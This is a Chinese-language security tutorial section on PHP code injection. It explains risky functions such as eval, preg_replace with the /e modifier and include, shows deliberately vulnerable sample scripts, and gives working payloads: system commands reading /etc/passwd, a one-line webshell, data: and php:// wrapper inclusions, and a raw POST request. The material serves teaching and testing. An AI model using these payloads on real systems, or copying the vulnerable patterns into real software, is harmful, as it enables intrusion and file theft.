# 3.4、代码注入

## 基础知识

应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。

**漏洞触发点**

- 程序过滤不严谨，导致用户可以将代码注入并执行。高危函数：eval()、assert()、preg_replace()、call_user_func()、`${}`执行代码、create_function()、array_map()、call_user_func_array()、array_filter()、usort()、uasort()

- 文件包含注射，当allow_url_include=On ，PHP Version>=5.2.0 时，导致代码注射。高危函数：include()、include_once()、require()、require_once()
- 对于执行命令的函数，参数过滤不严谨，导致直接命令执行。高危函数：system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()4.其他：反引号（`)可正常执行命令，实质是调用shell_exec()函数、ob_start()

### eval 

eval和assert函数这两个函数原本作用用于动态执行代码。

```
eval.php

<?php 
error_reporting(0);
show_source(__FILE__);

$a = @$_REQUEST['hello'];
eval("var_dump($a);"); 

```

Payload：

```
# windows
http://localhost/eval/index.php?hello=);eval($_GET['A']);//&A=system('whoami');
# linux
http://localhost/eval/index.php?hello=11);eval($_GET['c']);//&c=system('cat /etc/passwd');
# 一句话webshell
http://localhost/eval/index.php?hello=11);eval($_POST['c']);%2f%2f

```

### preg_replace 

preg_replace函数用于对字符串进行正则处理,搜索$subject中匹配$pattern的部分，以$replacement替换。当pattern中存在/e模式修饰符，即$replacement会被看成PHP代码来执行。

函数原型：

```
mixed preg_replace(mixed $pattern, mixed $replacement,mixed $subject [, int $limit = -1 [,int&$count]] )
```

漏洞代码：

```
preg_replace.php

<?php 
error_reporting(0);
show_source(__FILE__);

preg_replace("/\[(.*)\]/e","\\1",$_GET['str']);
```

Payload：

正则的意思是从$_GET[‘str’]变量里搜索中括号[]中间的内容作为第一组结果，preg_replace函数第二个参数为‘\\1’代表这里用第一组结果填充，这里是可以直接执行代码的。

```
http://localhost/learn/preg.php?str=[phpinfo()]
```

### include

文件包含函数在特定条件下的代码注射，如include()、include_once()、require()、require_once()。当allow_url_include=On ，PHP Version>=5.2.0 时，导致代码注射。

````
include.php

<?php 
error_reporting(0);
show_source(__FILE__);
include($_GET['a']);
````

Payload：

```
# 本地文件包含

http://localhost/learn/include.php?a=../phpinfo.php


# data:text/plain

http://localhost/learn/include.php?a=data:text/plain,<?php phpinfo();?>

- data:text/plain base64形式

http://202.112.51.130/learn/include.php?a=data:text/plain;base64,PD9waHAKcGhwaW5mbygpOwo/Pg==


# php://伪协议>> 访问各个输入/输出流

http://localhost/learn/include.php?a=php://filter/convert.base64-encode/resource=/etc/passwd

解开base64就得到原文
Tips:当head头有enctype=”multipart/form-data” 时，该伪协议无效。


# php://input形式

当hackbar发不出数据包，就用burpsuite构造数据包，实现一句话webshell效果

POST /learn/include.php?a=php://input HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=4ln93lscu4sqfcn9je3u2660q2
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

<?php system('pwd');?>
```

## 代码审计

[thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)